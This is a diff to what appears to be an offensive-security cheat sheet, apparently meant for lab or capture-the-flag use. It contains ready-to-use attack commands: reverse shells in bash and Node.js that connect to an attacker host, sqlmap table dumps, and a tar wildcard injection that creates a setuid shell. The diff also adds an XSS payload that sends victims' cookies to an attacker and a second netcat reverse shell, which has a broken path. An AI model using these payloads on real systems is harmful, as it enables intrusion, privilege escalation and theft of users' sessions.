@@ -37,7 +37,7 @@ dnsrecon -d <TARGET_DOMAIN> -n <TARGET_IP>
 ## HTTP Server Setup
 
 ```bash
-python -m http.server
+python3 -m http.server
 ```
 
 ## File Transfer
@@ -304,7 +304,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
 
 ## Node.js Reverse Shell
 
-```js
+```javascript
 require("child_process").exec(
   "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 >/tmp/f",
 );
@@ -368,6 +368,14 @@ sqlmap -u "<TARGET_URL>" -D <DATABASE_NAME> --tables --batch
 sqlmap -u "<TARGET_URL>" -D <DATABASE_NAME> -T <TABLE_NAME> --dump --batch
 ```
 
+# Cross-Site Scripting (XSS)
+
+## Cookie Stealing Payload
+
+```javascript
+<script>fetch('http://<ATTACKER_IP>:8000/?cookie='+document.cookie)</script>
+```
+
 # Crontab
 
 ## Enumeration
@@ -383,9 +391,14 @@ cd /etc/cron.d
 ## Tar Wildcard Injection
 
 ```bash
-echo -e '#!/bin/bash \ncp /bin/bash /home/<USER_NAME>\nchmod +s /home/<USER_NAME>/bash' > shell.sh
 touch -- '--checkpoint=1'
 touch -- '--checkpoint-action=exec=sh shell.sh'
+
+echo -e '#!/bin/bash \ncp /bin/bash /home/<USER_NAME>\nchmod +s /home/<USER_NAME>/bash' > shell.sh
+
+# OR
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f" > shell.sh
 ```
 
 # Buffer Overflow
